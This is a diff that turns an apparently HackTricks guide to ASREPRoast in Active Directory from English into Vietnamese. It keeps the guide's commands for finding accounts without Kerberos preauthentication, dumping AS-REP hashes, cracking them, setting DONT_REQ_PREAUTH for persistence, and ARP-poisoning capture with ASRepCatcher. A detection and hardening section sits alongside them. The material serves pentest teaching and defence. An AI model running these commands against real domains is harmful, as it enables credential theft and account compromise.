@@ -4,15 +4,15 @@
 
 ## ASREPRoast
 
-ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.
+ASREPRoast là một cuộc tấn công bảo mật khai thác các tài khoản người dùng không bật thuộc tính **Kerberos pre-authentication required**. Về cơ bản, lỗ hổng này cho phép kẻ tấn công yêu cầu xác thực cho một người dùng từ Domain Controller (DC) mà không cần mật khẩu của người dùng đó. Sau đó, DC phản hồi bằng một thông điệp được mã hóa bằng khóa suy ra từ mật khẩu của người dùng. Kẻ tấn công có thể thử crack thông điệp này offline để tìm ra mật khẩu của người dùng.
 
-The main requirements for this attack are:
+Các yêu cầu chính của cuộc tấn công này là:
 
-- **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
-- **Connection to the Domain Controller (DC)**: Attackers need access to the DC to send requests and receive encrypted messages.
-- **Optional domain account**: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames.
+- **Không bật Kerberos pre-authentication**: Tài khoản người dùng mục tiêu không được bật tính năng bảo mật này.
+- **Kết nối đến Domain Controller (DC)**: Kẻ tấn công cần truy cập DC để gửi yêu cầu và nhận các thông điệp đã mã hóa.
+- **Tài khoản domain (không bắt buộc)**: Có tài khoản domain giúp kẻ tấn công xác định các tài khoản người dùng dễ bị tấn công hiệu quả hơn thông qua truy vấn LDAP. Nếu không có tài khoản như vậy, kẻ tấn công phải đoán tên người dùng.
 
-#### Enumerating vulnerable users (need domain credentials)
+#### Liệt kê các tài khoản người dùng dễ bị tấn công (cần thông tin xác thực domain)
 
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
@@ -22,7 +22,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
 
-#### Request AS_REP message
+#### Yêu cầu thông điệp AS_REP
 
 ```bash:Using Linux
 # Installed package entrypoint (same logic as GetNPUsers.py)
@@ -39,18 +39,18 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 ```
 
 > [!WARNING]
-> Rubeus requests **RC4** by default, so Event ID **4768** usually shows **preauth type 0** and **ticket encryption type 0x17**. If you add **`/aes`** (or RC4 is disabled for the target), expect **AES etypes** instead.<sup>[[2]](#references)</sup>
+> Rubeus mặc định yêu cầu **RC4**, vì vậy Event ID **4768** thường hiển thị **preauth type 0** và **ticket encryption type 0x17**. Nếu thêm **`/aes`** (hoặc RC4 bị vô hiệu hóa cho mục tiêu), hãy dự kiến nhận được **AES etypes**.<sup>[[2]](#references)</sup>
 
-#### Quick one-liners (Linux)
+#### Các lệnh nhanh (Linux)
 
-- Enumerate potential targets first (e.g., from leaked build paths) with Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
-- Roast a whole username list without valid creds using NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
-- If you do have creds, let NetExec query LDAP and request every roastable account for you: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
-- If the output starts with **`$krb5asrep$23$`**, crack it with Hashcat **`-m 18200`**. If it starts with **`$krb5asrep$17$`** or **`$krb5asrep$18$`**, prefer John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>
+- Trước tiên, liệt kê các mục tiêu tiềm năng (ví dụ: từ các build path bị leak) bằng Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
+- Thực hiện roast trên toàn bộ danh sách username mà không cần creds hợp lệ bằng NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
+- Nếu có creds, để NetExec truy vấn LDAP và yêu cầu mọi tài khoản có thể roast thay bạn: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
+- Nếu đầu ra bắt đầu bằng **`$krb5asrep$23$`**, hãy crack bằng Hashcat **`-m 18200`**. Nếu bắt đầu bằng **`$krb5asrep$17$`** hoặc **`$krb5asrep$18$`**, nên dùng John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Cracking
 
-Don't assume every AS-REP roast is RC4. Modern tooling can return **RC4** (`$krb5asrep$23$`) or **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) depending on the requested/negotiated enctype. **`hashcat -m 18200`** is for **etype 23**, while **John** handles `krb5asrep` directly for **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
+Đừng cho rằng mọi AS-REP roast đều dùng RC4. Các công cụ hiện đại có thể trả về **RC4** (`$krb5asrep$23$`) hoặc **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), tùy thuộc vào enctype được yêu cầu/đàm phán. **`hashcat -m 18200`** dành cho **etype 23**, còn **John** xử lý trực tiếp `krb5asrep` cho **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ```bash
 john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
@@ -59,7 +59,7 @@ hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
 
 ### Persistence
 
-Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
+Buộc người dùng không yêu cầu **preauth** nếu bạn có quyền **GenericAll** (hoặc quyền ghi thuộc tính):
 
 ```bash:Using Windows
 # Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
@@ -73,22 +73,22 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
 ```
 
-### Detection and hardening
+### Phát hiện và gia cố bảo mật
 
-A successful **AS-REP request without preauthentication** produces a **4768** event on the DC with `Status=0x0` and `PreAuthType=0`; this records a request, not proof that anyone cracked the response or compromised the account. Do not require RC4 in the detection: `TicketEncryptionType=0x17` is a useful weak-encryption signal, but an attacker can request AES (event-log values `0x11`/`0x12`). On Windows Server 2016 and later with the January 14, 2025 (or newer) cumulative update, version 2 of event 4768 also exposes `ClientAdvertizedEncryptionTypes`, the account/DC supported etypes and available keys.<sup>[[5]](#references)</sup>
+Một **yêu cầu AS-REP không cần preauthentication** thành công sẽ tạo sự kiện **4768** trên DC với `Status=0x0` và `PreAuthType=0`; sự kiện này ghi nhận một yêu cầu, chứ không chứng minh rằng có người đã crack phản hồi hoặc xâm nhập tài khoản. Không yêu cầu RC4 trong quy tắc phát hiện: `TicketEncryptionType=0x17` là dấu hiệu hữu ích của mã hóa yếu, nhưng kẻ tấn công có thể yêu cầu AES (giá trị trong event log là `0x11`/`0x12`). Trên Windows Server 2016 trở lên, với bản cập nhật tích lũy ngày 14 tháng 1 năm 2025 (hoặc mới hơn), phiên bản 2 của sự kiện 4768 cũng hiển thị `ClientAdvertizedEncryptionTypes`, các etype được tài khoản/DC hỗ trợ và các khóa hiện có.<sup>[[5]](#references)</sup>
 
-A practical hunt flags a client advertising only RC4 while the account has AES keys, then correlates bursts from one source IP across several no-preauth users. Baseline legitimate exceptions rather than alerting on every `PreAuthType=0` event.
+Một cách săn tìm thực tế là đánh dấu client chỉ quảng bá RC4 trong khi tài khoản có khóa AES, sau đó đối chiếu các đợt yêu cầu dồn dập từ một địa chỉ IP nguồn nhắm đến nhiều người dùng không yêu cầu preauthentication. Thiết lập danh sách ngoại lệ hợp lệ theo baseline thay vì cảnh báo cho mọi sự kiện `PreAuthType=0`.
 
-For attribution, normalize the `IpAddress` field (which can contain `::ffff:`-mapped IPv4) and compare its time window with 4769 service-ticket or 5140 share-access events. Those events may name accounts active from the same address, but a no-preauth AS-REP request requires no authenticated account. Shared hosts, NAT, proxies, and multiple sessions mean matching an IP does **not** identify the person or account that sent the AS-REQ. Treat the related accounts as investigation leads and corroborate with endpoint or network evidence.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>
+Để quy kết, chuẩn hóa trường `IpAddress` (trường này có thể chứa địa chỉ IPv4 được ánh xạ thành `::ffff:`) và so sánh khung thời gian của nó với các sự kiện cấp service ticket 4769 hoặc truy cập share 5140. Những sự kiện đó có thể nêu tên các tài khoản hoạt động từ cùng địa chỉ, nhưng yêu cầu AS-REP không cần preauthentication không đòi hỏi tài khoản đã xác thực. Máy chủ dùng chung, NAT, proxy và nhiều phiên có nghĩa là việc khớp IP **không** xác định được người hoặc tài khoản đã gửi AS-REQ. Hãy xem các tài khoản liên quan là đầu mối điều tra và xác minh thêm bằng bằng chứng từ endpoint hoặc mạng.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>
 
-The durable fix is to clear **Do not require Kerberos preauthentication** on every user that does not strictly need it and rotate exposed account passwords. If an exception cannot be removed, use a long randomly generated password and minimal privileges. Disabling RC4 raises cracking cost but does not remove roastability because AES AS-REP responses remain offline-crackable.<sup>[[2]](#references)[[5]](#references)</sup>
+Cách khắc phục lâu dài là bỏ chọn **Do not require Kerberos preauthentication** trên mọi người dùng không thực sự cần tùy chọn này và đổi mật khẩu các tài khoản bị lộ. Nếu không thể gỡ ngoại lệ, hãy dùng mật khẩu dài được tạo ngẫu nhiên và cấp quyền tối thiểu. Vô hiệu hóa RC4 làm tăng chi phí cracking nhưng không loại bỏ khả năng roast, vì phản hồi AS-REP dùng AES vẫn có thể bị crack offline.<sup>[[2]](#references)[[5]](#references)</sup>
 
-## ASREProast without credentials
+## ASREProast không cần thông tin xác thực
 
-An on-path attacker can capture the AS-REP returned during a normal, preauthenticated AS exchange and format its encrypted part for offline cracking. Unlike classic ASREPRoasting, this does not require `DONT_REQ_PREAUTH`; however, it only yields accounts whose Kerberos exchange is actually intercepted. **ASRepCatcher** obtains the position with one-way ARP poisoning by default, or it can consume traffic from another MitM technique with `--disable-spoofing`.<sup>[[6]](#references)</sup>\
-If you want the related no-credential trick that returns a **service ticket** instead of a **TGT** from a no-preauth principal, see [Kerberoast](kerberoast.md).
+Kẻ tấn công on-path có thể bắt AS-REP được trả về trong một phiên trao đổi AS thông thường có preauthentication, rồi định dạng phần được mã hóa để crack offline. Khác với ASREPRoasting cổ điển, cách này không yêu cầu `DONT_REQ_PREAUTH`; tuy nhiên, nó chỉ thu được các tài khoản có phiên trao đổi Kerberos thực sự bị chặn. **ASRepCatcher** mặc định chiếm vị trí bằng kỹ thuật đầu độc ARP một chiều, hoặc có thể tiếp nhận lưu lượng từ một kỹ thuật MitM khác bằng `--disable-spoofing`.<sup>[[6]](#references)</sup>\
+Nếu bạn muốn xem thủ thuật liên quan không cần thông tin xác thực, trả về **service ticket** thay vì **TGT** từ một principal không yêu cầu preauthentication, hãy xem [Kerberoast](kerberoast.md).
 
-In `relay` mode, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) forwards intercepted AS-REQs and forces **RC4** when both sides still allow it. `listen` does not alter packets and therefore captures whichever enctype the client and DC negotiated. Scope poisoning with `-t`/`-tf` rather than touching the entire subnet when possible.<sup>[[6]](#references)</sup>
+Ở chế độ `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) chuyển tiếp các AS-REQ bị chặn và buộc dùng **RC4** nếu cả hai phía vẫn cho phép. `listen` không thay đổi gói tin, do đó sẽ bắt được enctype mà client và DC đã thương lượng. Khi có thể, hãy giới hạn phạm vi đầu độc bằng `-t`/`-tf` thay vì tác động đến toàn bộ subnet.<sup>[[6]](#references)</sup>
 
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
@@ -106,8 +106,6 @@ ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -form
 
 ---
 
-
-
 ---
 
 ## References
@@ -116,8 +114,8 @@ ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -form
 - [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
 - [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
 - [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
-- [5] [Microsoft – Event 4768: A Kerberos authentication ticket was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
+- [5] [Microsoft – Sự kiện 4768: Một vé xác thực Kerberos đã được yêu cầu](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
 - [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
-- [7] [Microsoft – Security event 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
-- [8] [Microsoft – Security event 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
+- [7] [Microsoft – Sự kiện bảo mật 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
+- [8] [Microsoft – Sự kiện bảo mật 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
 {{#include ../../banners/hacktricks-training.md}}
